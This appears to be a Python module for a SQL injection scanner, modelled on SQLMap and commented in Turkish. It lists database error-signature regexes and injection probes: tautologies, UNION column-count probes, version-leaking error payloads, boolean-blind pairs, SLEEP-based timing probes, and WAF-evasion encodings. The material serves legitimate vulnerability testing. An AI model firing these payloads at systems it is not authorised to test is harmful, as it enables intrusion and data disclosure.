"""SQLMap-inspired detection payloads — sömürü/destructive payload yok, sadece tespit."""

# SQLMap errors.xml + DBMS hata imzaları
DBMS_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*\Wmysqli?_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB) server version",
    r"Unknown column '[^']+' in 'field list'",
    r"MySqlClient\.",
    r"com\.mysql\.jdbc",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError:",
    r"org\.postgresql\.util\.PSQLException",
    r"Driver.* SQL[\-\_\ ]*Server",
    r"OLE DB.* SQL Server",
    r"(\W|\A)SQL Server.*Driver",
    r"Warning.*\W(mssql|sqlsrv)_",
    r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
    r"(?s)Exception.*\WRoadhouse\.Cms\.",
    r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
    r"(\W|\A)SQLServer JDBC Driver",
    r"com\.jnetdirect\.jsql",
    r"macromedia\.jdbc\.sqlserver",
    r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
    r"com\.microsoft\.sqlserver\.jdbc",
    r"Pdo\.(?:Mysql|Sqlite|Pg)",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
    r"Warning.*\W(sqlite_|SQLite3::)",
    r"\[SQLITE_ERROR\]",
    r"SQLite error \d+:",
    r"sqlite3\.OperationalError:",
    r"SQLITE_CONSTRAINT",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\W(oci|ora)_",
    r"quoted string not properly terminated",
    r"SQL command not properly ended",
    r"ORA-[0-9]{5}",
    r"Oracle.*SQLException",
    r"CLI Driver.*DB2",
    r"DB2 SQL error",
    r"SQLSTATE\[",
    r"Unclosed quotation mark after the character string",
    r"Incorrect syntax near",
    r"Syntax error.*in query expression",
    r"Unexpected end of SQL command",
    r"Syntax error in string in query expression",
    r"Data type mismatch in criteria expression",
    r"Microsoft Access Driver",
    r"JET Database Engine",
    r"ODBC Microsoft Access",
    r"Fatal error.*call to undefined function",
    r"SQL syntax",
    r"mysql_fetch",
    r"ORA-",
    r"PostgreSQL",
    r"MariaDB",
    r"SQLite",
    r"unclosed quotation mark",
    r"You have an error in your SQL",
    r"syntax error",
    r"near '",
    r'near "',
    r"at line \d+",
    r"Unknown column",
    r"Unknown table",
    r"Unknown database",
    r"Duplicate entry",
    r"Subquery returns more than 1 row",
    r"Operand should contain \d+ column",
    r"Illegal mix of collations",
    r"Invalid use of group function",
    r"Every derived table must have its own alias",
    r"Not unique table/alias",
    r"Truncated incorrect",
    r"Division by zero",
    r"Query failed",
    r"Database error",
    r"PDOException",
    r"Doctrine\\DBAL",
    r"Illuminate\\Database\\QueryException",
]

# SQLMap boundary / generic test payloads (detection)
BOUNDARY_PAYLOADS = [
    "'", '"', "''", '""', "'--", '"--', "'#", '"#', "'/*", '"/*',
    "')", '")', "'))", '"))', "' OR '1", '" OR "1',
    "\\", "\\\\", "%27", "%22", "%bf%27", "%bf%22",
    "1'", '1"', "1'--", '1"--', "1'#", '1"#',
]

# Error-triggering probes (SQLMap generic)
ERROR_PROBE_PAYLOADS = [
    "'", '"', "')", '")', "' OR '1'='1", '" OR "1"="1',
    "' OR 1=1--", '" OR 1=1--', "' OR 1=1#", '" OR 1=1#',
    "') OR ('1'='1", '") OR ("1"="1', "1' AND '1'='2", '1" AND "1"="2',
    "admin'--", 'admin"--', "' OR ''='", '" OR ""="',
    "1' ORDER BY 1--", '1" ORDER BY 1--', "1' ORDER BY 10--", '1" ORDER BY 10--',
    "1' ORDER BY 100--", '1" ORDER BY 100--',
    "' UNION SELECT NULL--", '" UNION SELECT NULL--',
    "' UNION SELECT NULL,NULL--", '" UNION SELECT NULL,NULL--',
    "' UNION SELECT NULL,NULL,NULL--", '" UNION SELECT NULL,NULL,NULL--',
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
    "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
]

# Boolean blind pairs (SQLMap technique — true vs false yanıt farkı)
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    ("' AND 1=1--", "' AND 1=2--"),
    ('" AND 1=1--', '" AND 1=2--'),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ('1" AND "1"="1"--', '1" AND "1"="2"--'),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ('") AND ("1"="1', '") AND ("1"="2'),
    ("' OR 'x'='x", "' OR 'x'='y"),
    ('" OR "x"="x', '" OR "x"="y'),
]

# Time-based hints (SQLMap — sadece gecikme sinyali, sömürü yok)
TIME_PAYLOADS = [
    ("'; WAITFOR DELAY '0:0:5'--", 'mssql'),
    ('"; WAITFOR DELAY "0:0:5"--', 'mssql'),
    ("1' AND SLEEP(5)--", 'mysql'),
    ('1" AND SLEEP(5)--', 'mysql'),
    ("1' AND pg_sleep(5)--", 'postgresql'),
    ('1" AND pg_sleep(5)--', 'postgresql'),
    ("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 'oracle'),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 'mysql'),
]

# SQLMap tamper-inspired encoding variants (WAF bypass tespiti)
def tamper_variants(payload):
    variants = [payload]
    variants.append(payload.replace(' ', '/**/'))
    variants.append(payload.replace(' ', '%20'))
    variants.append(payload.replace(' ', '%09'))
    variants.append(payload.replace(' ', '+'))
    variants.append(payload.replace("'", "%27").replace('"', '%22'))
    variants.append(payload.replace('OR', 'Or').replace('or', 'Or'))
    variants.append(payload.replace('AND', 'AnD'))
    return list(dict.fromkeys(variants))

# Stacked query detection probes (sadece hata/yanıt farkı)
STACKED_PROBE_PAYLOADS = [
    "'; SELECT 1--", '"; SELECT 1--',
    "'; SELECT 1#", '"; SELECT 1#',
    "1;SELECT 1", "1';SELECT 1--",
]

# UNION column count probes (SQLMap ORDER BY / UNION NULL)
UNION_PROBE_PAYLOADS = [
    "' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 3--",
    "' ORDER BY 4--", "' ORDER BY 5--", "' ORDER BY 6--",
    "' ORDER BY 7--", "' ORDER BY 8--", "' ORDER BY 9--", "' ORDER BY 10--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
]

def all_error_payloads():
    seen = set()
    for p in BOUNDARY_PAYLOADS + ERROR_PROBE_PAYLOADS + STACKED_PROBE_PAYLOADS + UNION_PROBE_PAYLOADS:
        for v in tamper_variants(p):
            if v not in seen:
                seen.add(v)
                yield v
